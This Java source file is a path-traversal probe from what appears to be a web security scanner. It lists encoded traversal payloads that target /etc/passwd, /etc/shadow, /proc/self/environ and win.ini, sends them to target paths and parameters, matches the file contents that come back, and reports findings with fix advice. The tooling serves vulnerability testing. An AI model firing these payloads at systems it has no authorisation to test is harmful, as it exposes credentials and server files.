package com.burpmax.active;

import java.util.*;
import java.util.regex.*;
import static com.burpmax.model.Finding.*;

class PathTraversalProbe {

    /**
     * Traversal payload set covering the encoding variants most likely to bypass
     * server-side or WAF path sanitisation filters.
     *
     * Grouped by technique:
     *  A. Literal traversal (raw ../ and ..\ sequences)
     *  B. URL-encoded separators (%2F, %5C)
     *  C. Double URL-encoding (%252F, %255C) - bypasses single-decode filters
     *  D. Overlong UTF-8 (%c0%af, %c1%1c) - bypasses ASCII-only decoders
     *  E. Mixed/repeated-dot obfuscation (....// style)
     *  F. UNC path injection for Windows (\\attacker shares - detected via win.ini)
     *  G. Null-byte termination (%00) - truncates extension checks in older runtimes
     *  H. Encoding after the filename - path-segment injection
     *
     * Confirmation signatures (LINUX_CONFIRM, WINDOWS_CONFIRM) are content-based
     * so they cannot be confused with a 200 response to a WAF block page.
     */
    private static final List<String> TRAVERSAL_PAYLOADS = List.of(
        // A - Literal
        "/../../../etc/passwd",
        "/../../../etc/shadow",
        "/../../../proc/self/environ",
        "/../../../windows/win.ini",
        "/../../../windows/system32/drivers/etc/hosts",

        // B - Single URL-encode (/ -> %2F, \ -> %5C)
        "/..%2F..%2F..%2Fetc%2Fpasswd",
        "/..%2F..%2F..%2Fetc%2Fshadow",
        "/..%5C..%5C..%5Cwindows%5Cwin.ini",

        // C - Double URL-encode (% -> %25, so / -> %252F) - bypasses single-pass decoders
        "/..%252F..%252F..%252Fetc%252Fpasswd",
        "/..%255C..%255C..%255Cwindows%255Cwin.ini",

        // D - Overlong UTF-8 encoding of / (U+002F -> %c0%af, %e0%80%af)
        // Accepted by Java servlet containers before CVE-2007-5461 and some nginx builds
        "/..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        "/..%e0%80%af..%e0%80%af..%e0%80%afetc%e0%80%afpasswd",

        // E - Repeated-dot / mixed obfuscation
        "/....//....//....//etc/passwd",
        "/....\\....\\....\\windows\\win.ini",
        "/.%2e/.%2e/.%2e/etc/passwd",
        "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",

        // F - Backslash on Windows targets (IIS, Tomcat on Windows)
        "\\..\\..\\..\\windows\\win.ini",
        "/..\\..\\..\\windows\\win.ini",

        // G - Null-byte termination (PHP < 5.3.4, some C-based apps)
        "/../../../etc/passwd%00.png",
        "/../../../etc/passwd%00.jpg",

        // H - Path parameter injection (;param=value style used by some Java frameworks)
        ";/../../../etc/passwd",
        "%3B/../../../etc/passwd"
    );

    // Patterns that confirm actual traversal (file content markers).
    // Each pattern is tied to a specific file via LINUX_FILES / WINDOWS_FILES below,
    // so fileName reporting is exact rather than a guess based on payload substring.
    private static final List<Pattern> LINUX_CONFIRM = List.of(
        // /etc/passwd  -- "root:x:0:0:" or "root:*:0:0:"
        Pattern.compile("root:[x*!]?:\\d+:\\d+:", Pattern.CASE_INSENSITIVE),
        // /etc/passwd  -- shell path in the last field
        Pattern.compile("/bin/(?:bash|sh|nologin|false)", Pattern.CASE_INSENSITIVE),
        // /etc/shadow  -- root entry has $-prefixed hash, followed by epoch days
        Pattern.compile("root:\\$[156y]\\$[^:]{10,}:[0-9]", Pattern.CASE_INSENSITIVE),
        // /etc/shadow  -- locked root account indicator (! or * prefix)
        Pattern.compile("root:[*!]:[0-9]{4,}:", Pattern.CASE_INSENSITIVE),
        // /proc/self/environ -- NULL-delimited key=value pairs with standard env vars
        Pattern.compile("(?:HOME|PATH|USER|SHELL|PWD)=/?[a-zA-Z0-9/_.-]{2,}", Pattern.CASE_INSENSITIVE),
        // /etc/hosts -- loopback line always present
        Pattern.compile("127\\.0\\.0\\.1\\s+localhost", Pattern.CASE_INSENSITIVE),
        Pattern.compile("::1\\s+localhost", Pattern.CASE_INSENSITIVE)
    );
    private static final List<Pattern> WINDOWS_CONFIRM = List.of(
        Pattern.compile("\\[extensions\\]", Pattern.CASE_INSENSITIVE),
        Pattern.compile("\\[fonts\\]", Pattern.CASE_INSENSITIVE),
        Pattern.compile("\\[mci extensions\\]", Pattern.CASE_INSENSITIVE),
        // C:\Windows\System32\drivers\etc\hosts
        Pattern.compile("127\\.0\\.0\\.1\\s+localhost", Pattern.CASE_INSENSITIVE),
        Pattern.compile("#\\s*Copyright.*Microsoft", Pattern.CASE_INSENSITIVE)
    );

    /** Returns the canonical file name for a confirmed traversal payload. */
    private static String fileNameFor(String traversal) {
        String t = traversal.toLowerCase();
        if (t.contains("shadow"))  return "/etc/shadow";
        if (t.contains("environ")) return "/proc/self/environ";
        if (t.contains("hosts"))   return "/etc/hosts (or Windows hosts)";
        if (t.contains("passwd"))  return "/etc/passwd";
        if (t.contains("win.ini")) return "C:\\Windows\\win.ini";
        return traversal;  // fallback: use the payload itself as evidence
    }

    static List<ActiveScanResult> probe(ProbeContext ctx, RequestBuilder rb,
                                        HttpSender sender) {
        List<ActiveScanResult> results = new ArrayList<>();

        for (String traversal : TRAVERSAL_PAYLOADS) {
            // Build path by appending traversal to current path
            String basePath = extractPath(ctx.url);
            String probePath = basePath + traversal;

            byte[] probeReq = rb.buildPathRequest(ctx, probePath);
            HttpSender.Response resp = sender.send(ctx.service, probeReq);
            if (resp == null || resp.statusCode() != 200) continue;

            String body = resp.body();
            // Check for confirmed file content
            boolean linux   = LINUX_CONFIRM.stream().anyMatch(p -> p.matcher(body).find());
            boolean windows = WINDOWS_CONFIRM.stream().anyMatch(p -> p.matcher(body).find());

            if (linux || windows) {
                String fileName = fileNameFor(traversal);
                results.add(new ActiveScanResult(
                    "Path Traversal (Local File Inclusion)", SEV_CRITICAL,
                    "A path traversal vulnerability was confirmed. The payload '" + traversal +
                    "' caused the server to read and return the contents of '" + fileName +
                    "'. An attacker can read any file on the server that the web process " +
                    "has permission to access, including configuration files, source code, " +
                    "private keys, and credential stores.",
                    "Payload: " + traversal + " | File content confirmed in response: " +
                    trunc(body, 150),
                    "PRIMARY FIX - Canonicalise and Jail:\n" +
                    "Resolve the full canonical path (File.getCanonicalPath(), os.path.realpath(),\n" +
                    "path.resolve()) then verify it starts with the expected base directory.\n" +
                    "Reject any path that escapes the base.\n\n" +
                    "SECONDARY CONTROLS:\n" +
                    "- Map user input to server-side identifiers, not raw filenames:\n" +
                    "    BAD:  /files?name=../../etc/passwd\n" +
                    "    GOOD: /files?id=42 (server maps 42 to /safe/dir/report.pdf)\n" +
                    "- Allowlist permitted filenames and extensions; reject everything else.\n" +
                    "- Run the web server as a non-root user with read access only to required dirs.\n" +
                    "- Deploy chroot or container isolation so path traversal cannot reach /etc or /root.",
                    "CWE-22", ctx.url, "path", traversal,
                    trunc(new String(probeReq), 300), trunc(body, 200),
                    probeReq, resp.raw(), -1L));
                return results; // confirmed - no need to try more payloads
            }
        }

        // Also probe file-type parameters (filename=, file=, path=, etc.)
        Set<String> fileParams = new LinkedHashSet<>();
        for (String p : ctx.allParamNames()) {
            String lower = p.toLowerCase();
            if (lower.contains("file") || lower.contains("path") || lower.contains("dir")
                    || lower.contains("name") || lower.contains("doc") || lower.contains("page")) {
                fileParams.add(p);
            }
        }
        for (String param : fileParams) {
            for (String traversal : TRAVERSAL_PAYLOADS) {
                byte[] probeReq = rb.buildProbeRequest(ctx, param, traversal);
                HttpSender.Response resp = sender.send(ctx.service, probeReq);
                if (resp == null || resp.statusCode() != 200) continue;
                String body = resp.body();
                boolean linux   = LINUX_CONFIRM.stream().anyMatch(p -> p.matcher(body).find());
                boolean windows = WINDOWS_CONFIRM.stream().anyMatch(p -> p.matcher(body).find());
                if (linux || windows) {
                    results.add(new ActiveScanResult(
                        "Path Traversal (Local File Inclusion)", SEV_CRITICAL,
                        "A path traversal vulnerability was confirmed via parameter '" + param +
                        "'. File content was returned in the response.",
                        "Parameter: " + param + " | Payload: " + traversal +
                        " | File content confirmed: " + trunc(body, 100),
                        "PRIMARY FIX: resolve the canonical path and verify it begins with the\n" +
                        "expected base directory. Map user input to server-side identifiers\n" +
                        "rather than accepting raw filenames or paths.",
                        "CWE-22", ctx.url, param, traversal,
                        trunc(new String(probeReq), 300), trunc(body, 200),
                    probeReq, resp.raw(), -1L));
                    return results;
                }
            }
        }
        return results;
    }

    private static String extractPath(String url) {
        try {
            java.net.URL u = new java.net.URL(url);
            String path = u.getPath();
            return path.isEmpty() ? "/" : path;
        } catch (Exception e) { return "/"; }
    }
    private static String trunc(String s, int n) {
        return s == null ? "" : s.length() > n ? s.substring(0, n) + "..." : s;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// CSRF Detection (analysis — no form submission)
// ─────────────────────────────────────────────────────────────────────────────
